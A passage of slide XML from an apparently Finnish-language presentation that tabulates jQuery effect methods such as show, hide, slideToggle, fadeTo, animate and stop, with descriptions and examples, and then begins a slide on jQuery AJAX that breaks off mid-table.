                </a:gridCol>
              </a:tblGrid>
              <a:tr h="370779">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>Method</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91431" marR="91431" marT="45713" marB="45713"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>Description</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91431" marR="91431" marT="45713" marB="45713"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>Example</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91431" marR="91431" marT="45713" marB="45713"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="10000"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="370779">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" b="0" dirty="0"/>
                        <a:t>.show([speed])</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91431" marR="91431" marT="45713" marB="45713"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" b="0" dirty="0"/>
                        <a:t>display an element</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91431" marR="91431" marT="45713" marB="45713"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>$('.t1').show('slow')</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91431" marR="91431" marT="45713" marB="45713"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="10001"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="370779">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>.hide([speed])</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91431" marR="91431" marT="45713" marB="45713"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>hides an</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" baseline="0" dirty="0"/>
                        <a:t> element</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91431" marR="91431" marT="45713" marB="4571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$('.t1').hide()</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91431" marR="91431" marT="45713" marB="45713"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="10002"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="370779">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>.toggle([speed])</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91431" marR="91431" marT="45713" marB="45713"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>toggle</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" baseline="0" dirty="0"/>
                        <a:t> element visible or not</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91431" marR="91431" marT="45713" marB="4571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$('.t1').toggle()</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91431" marR="91431" marT="45713" marB="45713"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="10003"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="370779">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>.</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
                        <a:t>slideDown</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>([speed])</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91431" marR="91431" marT="45713" marB="45713"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>adjust height to reveal element</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91431" marR="91431" marT="45713" marB="4571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$('.t1').</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
                        <a:t>slideDown</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>()</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91431" marR="91431" marT="45713" marB="45713"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="10004"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="370779">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>.</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
                        <a:t>slideUp</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>([speed])</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91431" marR="91431" marT="45713" marB="45713"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>adjust height to hide an element</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91431" marR="91431" marT="45713" marB="4571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$('.t1').</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
                        <a:t>slideUp</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>()</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91431" marR="91431" marT="45713" marB="45713"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="10005"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="370779">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>.</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
                        <a:t>slideToggle</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>([speed])</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91431" marR="91431" marT="45713" marB="45713"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>adjust height to reveal/hide</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91431" marR="91431" marT="45713" marB="4571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$('.t1').</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
                        <a:t>slideToggle</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>()</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91431" marR="91431" marT="45713" marB="45713"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="10006"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="370779">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>.</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
                        <a:t>fadeIn</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>([speed])</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91431" marR="91431" marT="45713" marB="45713"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>fade</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" baseline="0" dirty="0"/>
                        <a:t> in an element</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91431" marR="91431" marT="45713" marB="45713"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>$('.t1').</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
                        <a:t>fadeIn</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>('fast')</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91431" marR="91431" marT="45713" marB="45713"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="10007"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="370779">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>.</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
                        <a:t>fadeOut</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>([speed])</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91431" marR="91431" marT="45713" marB="45713"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>fade out an element</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91431" marR="91431" marT="45713" marB="45713"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>$('.t1').</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
                        <a:t>fadeOut</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>('normal')</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91431" marR="91431" marT="45713" marB="45713"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="10008"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="640066">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>.</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
                        <a:t>fadeTo</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>(speed,</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" baseline="0" dirty="0"/>
                        <a:t> </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" baseline="0" dirty="0" err="1"/>
                        <a:t>opaticity</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>)</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91431" marR="91431" marT="45713" marB="45713"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>fade</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" baseline="0" dirty="0"/>
                        <a:t> to certain opacity</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91431" marR="91431" marT="45713" marB="45713"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="fi-FI" sz="1800" b="0" i="0" kern="1200" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="dk1"/>
                          </a:solidFill>
                          <a:latin typeface="+mn-lt"/>
                          <a:ea typeface="+mn-ea"/>
                          <a:cs typeface="+mn-cs"/>
                        </a:rPr>
                        <a:t>$(</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="fi-FI" sz="1800" b="0" i="0" kern="1200" dirty="0" err="1">
                          <a:solidFill>
                            <a:schemeClr val="dk1"/>
                          </a:solidFill>
                          <a:latin typeface="+mn-lt"/>
                          <a:ea typeface="+mn-ea"/>
                          <a:cs typeface="+mn-cs"/>
                        </a:rPr>
                        <a:t>this</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="fi-FI" sz="1800" b="0" i="0" kern="1200" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="dk1"/>
                          </a:solidFill>
                          <a:latin typeface="+mn-lt"/>
                          <a:ea typeface="+mn-ea"/>
                          <a:cs typeface="+mn-cs"/>
                        </a:rPr>
                        <a:t>).</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="fi-FI" sz="1800" b="0" i="0" kern="1200" dirty="0" err="1">
                          <a:solidFill>
                            <a:schemeClr val="dk1"/>
                          </a:solidFill>
                          <a:latin typeface="+mn-lt"/>
                          <a:ea typeface="+mn-ea"/>
                          <a:cs typeface="+mn-cs"/>
                        </a:rPr>
                        <a:t>fadeTo</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="fi-FI" sz="1800" b="0" i="0" kern="1200" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="dk1"/>
                          </a:solidFill>
                          <a:latin typeface="+mn-lt"/>
                          <a:ea typeface="+mn-ea"/>
                          <a:cs typeface="+mn-cs"/>
                        </a:rPr>
                        <a:t>('</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="fi-FI" sz="1800" b="0" i="0" kern="1200" dirty="0" err="1">
                          <a:solidFill>
                            <a:schemeClr val="dk1"/>
                          </a:solidFill>
                          <a:latin typeface="+mn-lt"/>
                          <a:ea typeface="+mn-ea"/>
                          <a:cs typeface="+mn-cs"/>
                        </a:rPr>
                        <a:t>slow</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="fi-FI" sz="1800" b="0" i="0" kern="1200" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="dk1"/>
                          </a:solidFill>
                          <a:latin typeface="+mn-lt"/>
                          <a:ea typeface="+mn-ea"/>
                          <a:cs typeface="+mn-cs"/>
                        </a:rPr>
                        <a:t>', 0.33)</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91431" marR="91431" marT="45713" marB="45713"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="10009"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="640066">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>.animate(properties, speed, easing)</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91431" marR="91431" marT="45713" marB="45713"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>make a custom animation</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91431" marR="91431" marT="45713" marB="45713"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" b="0" i="0" kern="1200" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="dk1"/>
                          </a:solidFill>
                          <a:latin typeface="+mn-lt"/>
                          <a:ea typeface="+mn-ea"/>
                          <a:cs typeface="+mn-cs"/>
                        </a:rPr>
                        <a:t>$(".block").</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" b="0" i="0" u="none" kern="1200" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="dk1"/>
                          </a:solidFill>
                          <a:latin typeface="+mn-lt"/>
                          <a:ea typeface="+mn-ea"/>
                          <a:cs typeface="+mn-cs"/>
                        </a:rPr>
                        <a:t>animate</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" b="0" i="0" kern="1200" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="dk1"/>
                          </a:solidFill>
                          <a:latin typeface="+mn-lt"/>
                          <a:ea typeface="+mn-ea"/>
                          <a:cs typeface="+mn-cs"/>
                        </a:rPr>
                        <a:t>({left: '+=100px'}, 2000);</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t> </a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91431" marR="91431" marT="45713" marB="45713"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="10010"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="370779">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>.stop()</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91431" marR="91431" marT="45713" marB="45713"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>stop all animations</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91431" marR="91431" marT="45713" marB="45713"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="fi-FI" sz="1800" b="0" i="0" kern="1200" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="dk1"/>
                          </a:solidFill>
                          <a:latin typeface="+mn-lt"/>
                          <a:ea typeface="+mn-ea"/>
                          <a:cs typeface="+mn-cs"/>
                        </a:rPr>
                        <a:t>$(".</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="fi-FI" sz="1800" b="0" i="0" kern="1200" dirty="0" err="1">
                          <a:solidFill>
                            <a:schemeClr val="dk1"/>
                          </a:solidFill>
                          <a:latin typeface="+mn-lt"/>
                          <a:ea typeface="+mn-ea"/>
                          <a:cs typeface="+mn-cs"/>
                        </a:rPr>
                        <a:t>block</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="fi-FI" sz="1800" b="0" i="0" kern="1200" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="dk1"/>
                          </a:solidFill>
                          <a:latin typeface="+mn-lt"/>
                          <a:ea typeface="+mn-ea"/>
                          <a:cs typeface="+mn-cs"/>
                        </a:rPr>
                        <a:t>").stop();</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1800" b="0" dirty="0"/>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91431" marR="91431" marT="45713" marB="45713"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="10011"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
            </a:tbl>
          </a:graphicData>
        </a:graphic>
      </p:graphicFrame>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="193593" name="Tekstikehys 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{4908EA20-F3E0-41E8-817C-25E09D54CD62}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="2024063" y="1214438"/>
            <a:ext cx="7715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fi-FI" sz="1800">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>speed parameter can be number in ms or 'slow', 'normal'  (default) or 'fast'</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Otsikko 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{0FCF5B21-2ED9-4570-B329-90F658A9C085}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI">
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>jQuery AJAX</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="fi-FI"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:graphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="4" name="Sisällön paikkamerkki 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{24432B5E-35A7-47D6-AB94-05E2891036AA}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvGraphicFramePr>
            <a:graphicFrameLocks noGrp="1"/>
          </p:cNvGraphicFramePr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="609600" y="1600200"/>
          <a:ext cx="10972800" cy="4845049"/>
        </p:xfrm>
        <a:graphic>
          <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/table">
            <a:tbl>
              <a:tblPr firstRow="1" bandRow="1">
                <a:tableStyleId>{5C22544A-7EE6-4342-B048-85BDC9FD1C3A}</a:tableStyleId>
              </a:tblPr>
              <a:tblGrid>
                <a:gridCol w="2822104">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="20000"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="4493096">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70820">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>Method</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45717" marB="45717"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>Description</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45717" marB="45717"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>Example</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45717" marB="45717"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="10000"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="370820">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>.</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
                        <a:t>ajax</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>(</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0">
                          <a:hlinkClick r:id="rId3"/>
                        </a:rPr>
                        <a:t>settings</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>)</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45717" marB="45717"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>perform an AJAX request</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45717" marB="45717"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>$.</a:t>
                      </a:r>
                      <a:r>
